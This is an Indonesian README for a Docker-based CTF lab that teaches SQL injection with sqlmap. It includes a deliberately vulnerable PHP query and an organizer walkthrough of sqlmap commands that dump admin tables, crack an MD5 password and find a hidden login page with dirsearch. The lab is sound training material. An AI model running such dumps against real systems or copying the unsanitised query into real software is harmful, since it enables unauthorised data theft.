# LAIN CTF — SQL Injection Lab (sqlmap practice)

Web CTF latihan SQL injection bertema **Serial Experiments Lain**, dibuat khusus untuk sqlmap.

> Hanya untuk edukasi. Jangan pernah host ini terbuka ke publik tanpa izin.

---

## Deploy (Ubuntu server / di mana saja dengan Docker)

```bash
docker compose up -d --build
```

Akses: `http://<server-ip>:8080`

Saat pertama jalan, MySQL otomatis men-seed 2 database via `db/init.sql`, lalu container web menanam Flag 3 ke tabel `admin.secrets`.

**Ganti flag:** edit environment `FLAG_ERROR`, `FLAG_ADMIN_PAGE`, `FLAG_DUMP` di `docker-compose.yml`, lalu:
```bash
docker compose down && docker compose up -d --build
```
(Jika volume DB sudah terlanjur ada dan hanya flag dump yang berubah, restart service `web` saja cukup — seeder akan menimpa isi tabel `secrets`.)

## Arsitektur

| Service | Image | Keterangan |
|---|---|---|
| `web` | php:8.2-apache | Aplikasi, publish `8080:80` |
| `db` | mysql:5.7 | Port TIDAK dipublish ke host (sqlmap harus lewat web) |

Database:
- `lain` → tabel `episodes` (13 episode, target query `detail.php`)
- `admin` → tabel `admins` (`Lain` / MD5 password) + tabel `secrets` (flag)

## URL

| Halaman | URL |
|---|---|
| Landing/list episode | `/` (home.php) |
| Detail episode (rentan) | `/detail.php?id=1` |
| Login admin (tersembunyi) | `/administrator/` |

Link admin sengaja tidak ada di halaman manapun — peserta harus menemukannya dengan dirsearch.

## Titik Rentan

`detail.php?id=<input>` — parameter GET langsung disuntik ke query tanpa sanitasi:

```php
$sql = "SELECT id, title, description FROM episodes WHERE id = " . $id;
```

Error MySQL ditampilkan langsung di halaman (error-based, sangat ramah sqlmap).

## 3 Flag

| # | Flag | Lokasi | Cara dapat |
|---|---|---|---|
| 1 | `FLAG_ERROR` | Halaman error SQL | Buka `detail.php?id=1'` |
| 2 | `FLAG_ADMIN_PAGE` | HTML comment di `administrator/index.php` | Dirsearch dulu untuk menemukan path `/administrator/`, lalu view source |
| 3 | `FLAG_DUMP` | Tabel `admin.secrets` + dashboard admin | sqlmap dump → crack MD5 → login |

## Walkthrough (ORGANIZER ONLY — spoiler)

```bash
# 1. Deteksi injeksi
sqlmap -u "http://<server>:8080/detail.php?id=1" --batch

# 2. Enumerasi database
sqlmap -u "http://<server>:8080/detail.php?id=1" --dbs
#    → lain, admin, information_schema

# 3. Dump database admin
sqlmap -u "http://<server>:8080/detail.php?id=1" -D admin --tables
sqlmap -u "http://<server>:8080/detail.php?id=1" -D admin -T admins --dump
#    → username: Lain | password_hash: 26defa4f6e805a82e9d774080fad7312 (MD5)
sqlmap -u "http://<server>:8080/detail.php?id=1" -D admin -T secrets --dump
#    → FLAG 3

# 4. Crack hash MD5 (password-nya "cyberia")
#    hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
#    atau john --format=Raw-MD5 hash.txt, atau crackstation.net

# 5. Temukan halaman admin via dirsearch (link admin TIDAK ada di landing page)
#    dirsearch -u http://<server>:8080/ 
#    → /administrator/ (301, buka langsung = form login)
#    Lalu view source halaman login → FLAG 2

# 6. Login di /administrator/ → FLAG 3 tampil juga di dashboard
```

## Reset lengkap

```bash
docker compose down -v   # -v menghapus volume DB, seed jalan ulang
docker compose up -d --build
```
